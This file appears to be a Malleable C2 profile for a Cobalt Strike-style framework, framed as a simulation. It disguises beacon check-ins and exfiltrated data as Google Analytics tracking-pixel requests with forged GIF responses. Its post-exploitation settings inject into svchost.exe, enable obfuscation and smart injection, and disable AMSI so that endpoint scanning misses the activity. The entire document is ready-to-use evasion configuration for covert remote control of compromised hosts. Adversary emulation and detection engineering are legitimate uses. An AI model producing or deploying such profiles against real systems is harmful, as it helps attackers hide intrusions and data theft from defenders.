# Simulating a C2 framework with a web bug pattern
# Author: @Dcodezero

# Configuration
set sleeptime "5000";
set host_stage "false";  # Disables staging to prevent payload exposure
set useragent "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)";

https-certificate {
     set keystore "";
     set password "";
}

http-get {
    set uri "/___utm.gif";
    client {
        parameter "utmac" "UA-2202604-2";
        parameter "utmcn" "1";
        parameter "utmcs" "ISO-8859-1";
        parameter "utmsr" "1280x1024";
        parameter "utmsc" "32-bit";
        parameter "utmul" "en-US";

        metadata {
            base64url;
            prepend "__utma";
            parameter "utmcc";
        }
    }

    server {
        header "Content-Type" "image/gif";

        output {
            prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
            prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
            prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";

            print;
        }
    }
}

http-post {
    set uri "/__utm.gif";
    set verb "POST";
    client {
        id {
            prepend "UA-220";
            append "-2";
            parameter "utmac";
        }

        parameter "utmcn" "1";
        parameter "utmcs" "ISO-8859-1";
        parameter "utmsr" "1280x1024";
        parameter "utmsc" "32-bit";
        parameter "utmul" "en-US";

        output {
            base64url;
            prepend "__utma";
            parameter "utmcc";
        }
    }

    server {
        header "Content-Type" "image/gif";

        output {
            prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
            prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
            prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";

            print;
        }
    }
}

http-stager {
    set uri_x86 "/_init.gif";
    set uri_x64 "/__init.gif";

    server {
        header "Content-Type" "image/gif";

        output {
            prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
            prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
            prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";

            print;
        }
    }
}

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\svchost.exe";  # Replacing rundll32.exe
    set spawnto_x64 "%windir%\\sysnative\\svchost.exe"; # Replacing rundll32.exe

    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
}
